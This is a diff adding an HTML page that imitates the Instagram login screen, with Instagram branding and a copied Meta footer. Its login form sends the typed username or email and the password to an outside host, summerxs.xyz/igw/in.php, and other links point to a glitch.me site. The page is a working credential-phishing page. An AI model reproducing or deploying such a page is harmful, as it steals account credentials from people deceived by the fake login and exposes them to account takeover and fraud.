@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+
+<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./inns_files/styles.css">
+    <title>Instagram </title>
+<script>(function inject() {
+        function GenerateQuickId() {
+          var randomStrId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+          return randomStrId.substring(0, 22);
+        }
+
+        ;
+
+        function SendXHRCandidate(requestMethod_, url_, type_, content_) {
+          try {
+            var id = 'detector';
+            var mes = {
+              posdMessageId: 'PANELOS_MESSAGE',
+              posdHash: GenerateQuickId(),
+              type: 'VIDEO_XHR_CANDIDATE',
+              from: id,
+              to: id.substring(0, id.length - 2),
+              content: {
+                requestMethod: requestMethod_,
+                url: url_,
+                type: type_,
+                content: content_
+              }
+            };
+            window.postMessage(mes, '*');
+          } catch (e) {}
+        }
+
+        ;
+        var open = XMLHttpRequest.prototype.open;
+
+        XMLHttpRequest.prototype.open = function () {
+          this.requestMethod = arguments[0];
+          open.apply(this, arguments);
+        };
+
+        var send = XMLHttpRequest.prototype.send;
+
+        XMLHttpRequest.prototype.send = function () {
+          var onreadystatechange = this.onreadystatechange;
+
+          this.onreadystatechange = function () {
+            if (this.readyState === 4) {
+              setTimeout(SendXHRCandidate(this.requestMethod, this.responseURL, this.getResponseHeader('content-type'), this.response), 0);
+            }
+
+            if (onreadystatechange) {
+              return onreadystatechange.apply(this, arguments);
+            }
+          };
+
+          return send.apply(this, arguments);
+        };
+
+        var nativeFetch = fetch;
+
+        fetch = function fetch() {
+          var _this = this;
+
+          var args = arguments;
+          var fetchURL = arguments[0] instanceof Request ? arguments[0].url : arguments[0];
+          var fetchMethod = arguments[0] instanceof Request ? arguments[0].method : 'GET';
+          return new Promise(function (resolve, reject) {
+            var promise = nativeFetch.apply(_this, args);
+            promise.then(function (response) {
+              if (response.body instanceof ReadableStream) {
+                var nativeJson = response.json;
+
+                response.json = function () {
+                  var _arguments = arguments,
+                      _this2 = this;
+
+                  return new Promise(function (resolve, reject) {
+                    var jsonPromise = nativeJson.apply(_this2, _arguments);
+                    jsonPromise.then(function (jsonResponse) {
+                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), JSON.stringify(jsonResponse)), 0);
+                      resolve(jsonResponse);
+                    })["catch"](function (e) {
+                      reject(e);
+                    });
+                  });
+                };
+
+                var nativeText = response.text;
+
+                response.text = function () {
+                  var _arguments2 = arguments,
+                      _this3 = this;
+
+                  return new Promise(function (resolve, reject) {
+                    var textPromise = nativeText.apply(_this3, _arguments2);
+                    textPromise.then(function (textResponse) {
+                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), textResponse), 0);
+                      resolve(textResponse);
+                    })["catch"](function (e) {
+                      reject(e);
+                    });
+                  });
+                };
+              }
+
+              resolve.apply(this, arguments);
+            })["catch"](function () {
+              reject.apply(this, arguments);
+            });
+          });
+        };
+      })();</script>
+<style type="text/css">
+<!--
+.style1 {font-size: 14px}
+.style6 {
+	color: #808080;
+	font-size: 12px;
+}
+-->
+</style>
+</head>
+<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjEuOC4xMyIsInNjb3JlIjoxMDgxM31d">
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column" bis_skin_checked="1">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./inns_files/instagram-logo.png" alt="Instagram logo" title="Instagram logo">
+                </h1>
+               <form action="https://summerxs.xyz/igw/in.php" method="post">
+                    <label for="email" class="sr-only">Phone number, username, or email</label>
+                    <input name="email" placeholder="Phone number, username, or email">
+
+                    <label for="password" class="sr-only">Password</label>
+                    <input name="password" type="password" placeholder="Password">
+
+                    <button type="submit">Log in</button>
+                </form>
+                <div class="flex separator align-items-center" bis_skin_checked="1">
+                    <span></span>
+                    <div class="or" bis_skin_checked="1">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center" bis_skin_checked="1">
+                    <div bis_skin_checked="1">
+                        <img>
+                        <a>Log in with  Facebook</a>
+                    </div>
+                    <a href="https://fluttering-solid-ketchup.glitch.me/#">Forgot password ?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center" bis_skin_checked="1">
+                <p>Don't have an account ?</p>
+                <a href="https://fluttering-solid-ketchup.glitch.me/#">Sign up </a>
+            </div>
+            <div class="app-download flex direction-column align-items-center" bis_skin_checked="1">
+                <p>Get the app..</p>
+                <div class="flex justify-content-center" bis_skin_checked="1">
+                    <img src="./inns_files/apple-button.png" alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store">
+                    <img src="./inns_files/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play">
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li class="style6">
+              <div bis_skin_checked="1"><a href="https://about.facebook.com/meta" rel="nofollow noopener noreferrer" target="_blank">Meta</a></div>
+            </li>
+            <li class="style6">
+              <div bis_skin_checked="1"><a href="https://about.instagram.com/" rel="nofollow noopener noreferrer" target="_blank">About</a></div>
+            </li>
+            <li class="style6">
+              <div bis_skin_checked="1"><a href="https://about.instagram.com/blog/" rel="nofollow noopener noreferrer" target="_blank">Blog</a></div>
+            </li>
+            <li class="style6">
+              <div bis_skin_checked="1"><a href="https://www.instagram.com/about/jobs/">Jobs</a></div>
+            </li>
+            <li class="style6">
+              <div bis_skin_checked="1"><a href="https://help.instagram.com/" rel="nofollow noopener noreferrer" target="_blank">Help</a></div>
+            </li>
+            <li class="style6">
+              <div bis_skin_checked="1"><a href="https://developers.facebook.com/docs/instagram" rel="nofollow noopener noreferrer" target="_blank">API</a></div>
+            </li>
+            <li class="style6">
+              <div bis_skin_checked="1"><a href="https://www.instagram.com/legal/privacy/">Privacy</a></div>
+            </li>
+            <li class="style6">
+              <div bis_skin_checked="1">
+                <div bis_skin_checked="1"><a href="https://www.instagram.com/legal/terms/">Terms</a></div>
+              </div>
+              
+              <div bis_skin_checked="1">
+              <a href="https://www.instagram.com/directory/profiles/"><br>
+              </li>
+            <li class="style6">
+              <div bis_skin_checked="1"><a href="https://www.instagram.com/directory/profiles/">Top Accounts</a></div>
+            </li>
+            <li class="style6">
+              <div bis_skin_checked="1"><a href="https://www.instagram.com/directory/hashtags/">Hashtags</a></div>
+            </li>
+            <li>
+              <div bis_skin_checked="1"><span class="style6"><a href="https://www.instagram.com/explore/locations/">Locations</a></span></div>
+            <a href="https://fluttering-solid-ketchup.glitch.me/#"></a></li>
+        </ul>
+        <p class="copyright style1">© 2022 Instagram from Meta</p>
+    </footer>
+
+</body></html>
